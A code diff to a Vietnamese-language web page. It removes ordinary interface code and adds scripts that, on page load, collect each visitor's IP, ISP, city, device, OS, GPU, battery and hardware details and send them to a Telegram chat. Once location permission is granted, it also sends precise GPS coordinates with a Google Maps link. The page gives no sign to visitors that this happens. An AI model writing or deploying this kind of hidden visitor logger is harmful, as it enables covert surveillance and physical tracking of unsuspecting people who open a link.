+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const long = position.coords.longitude;
+                        const accuracy = position.coords.accuracy; // Độ chính xác (mét)
+                        
+                        const mapsLink = `https://www.google.com/maps?q=${lat},${long}`;
+                        
+                        document.getElementById('loc-txt').innerHTML = `
+                            <span style="color:#4ade80">Đã định vị chính xác!</span><br>
+                            <a href="${mapsLink}" target="_blank" style="color:var(--primary-accent); text-decoration:none; font-size:0.9rem">
+                                Xem trên Google Maps
+                            </a>
+                        `;
+                        btn.style.display = 'none';
+
+                        // GỬI BÁO CÁO LẦN 2 (CÓ GPS)
+                        const msg = `
+🚨 <b>VỊ TRÍ CHÍNH XÁC (GPS)</b> 🚨
+--------------------------------
+🎯 <b>Google Maps:</b> <a href="${mapsLink}">Xem Bản Đồ</a>
+📏 <b>Độ chính xác:</b> Bán kính ${Math.round(accuracy)} mét
+🌐 <b>IP:</b> ${systemData.ip}
+📱 <b>Thiết bị:</b> ${systemData.device}
+`;
+                        sendToTelegram(msg);
+                    },
+                    (error) => {
+                        btn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Bạn đã từ chối';
+                        alert("Không thể lấy vị trí. Hãy bật GPS và chọn 'Cho phép' trên trình duyệt.");
+                    }
+                );
+            } else {
+                alert("Trình duyệt không hỗ trợ GPS.");
             }
-            lastScrollTop = scrollTop <= 0 ? 0 : scrollTop;
-        });
-
-        // Stats Counter
-        const statsObserver = new IntersectionObserver((entries, observer) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    document.querySelectorAll('.stat-num').forEach(c => {
-                        const t = +c.getAttribute('data-target'); let n=0, i=t/50;
-                        const u = () => { n+=i; if(n<t){ c.innerText=Math.ceil(n); requestAnimationFrame(u); }else{ c.innerText=t+"+"; } };
-                        u();
-                    });
-                    observer.unobserve(entry.target);
-                }
-            });
-        }, { threshold: 0.5 });
-
-        let isMenuOpen = false;
-        function toggleMenu() {
-            const sb=document.getElementById('sidebar'), ov=document.getElementById('overlay'), ic=document.querySelector('.sidebar-toggle i');
-            isMenuOpen = !isMenuOpen;
-            sb.classList.toggle('active'); ov.classList.toggle('active'); 
-            ic.className = isMenuOpen ? 'fas fa-times' : 'fas fa-bars';
-            document.body.style.overflow = isMenuOpen ? 'hidden' : 'auto';
-            if(isMenuOpen) sidebarToggle.classList.remove('hidden');
         }
 
-        function setupScrollTrack(id) {
-            const track = document.getElementById(id);
-            if(track) Array.from(track.children).forEach(item => track.appendChild(item.cloneNode(true)));
+        // Hàm tổng hợp và gửi tin nhắn
+        function reportToAdmin(hasGPS) {
+            const msg = `
+🔔 <b>NEW VISITOR DETECTED</b>
+--------------------------------
+🌐 <b>IP:</b> <code>${systemData.ip}</code>
+🏢 <b>ISP:</b> ${systemData.isp}
+📍 <b>Khu vực (IP):</b> ${systemData.city}, ${systemData.country}
+--------------------------------
+📱 <b>Thiết bị:</b> ${systemData.device}
+💻 <b>OS:</b> ${systemData.os}
+🖥 <b>Màn hình:</b> ${window.screen.width}x${window.screen.height}
+🎮 <b>GPU:</b> ${systemData.gpu}
+🔋 <b>Pin:</b> ${systemData.battery}
+🧠 <b>System:</b> ${systemData.ram || '?'} RAM | ${systemData.cores || '?'} Cores
+🔗 <b>Link vào:</b> ${window.location.href}
+`;
+            sendToTelegram(msg);
         }
-        
-        // Ví dụ hàm gửi Log về Telegram (Cần Token và ChatID)
-        /*
-        function sendLogToTelegram(data, os, browser, gpu) {
-            const token = "YOUR_BOT_TOKEN";
-            const chat_id = "YOUR_CHAT_ID";
-            const text = `New Visitor:\nIP: ${data.ip}\nLocation: ${data.city}, ${data.country}\nOS: ${os}\nBrowser: ${browser}\nGPU: ${gpu}`;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
-        }
-        */
+
+        // --- KHỞI CHẠY ---
+        window.onload = () => {
+            setTimeout(() => document.getElementById('loader').style.opacity = '0', 500);
+            setTimeout(() => document.getElementById('loader').style.display = 'none', 1000);
+            
+            parseUserAgent();
+            getHardwareInfo();
+            getBatteryStatus();
+            getNetworkInfo(); // Hàm này sẽ gọi sendToTelegram khi xong
+        };
+
     </script>
 </body>
 </html>
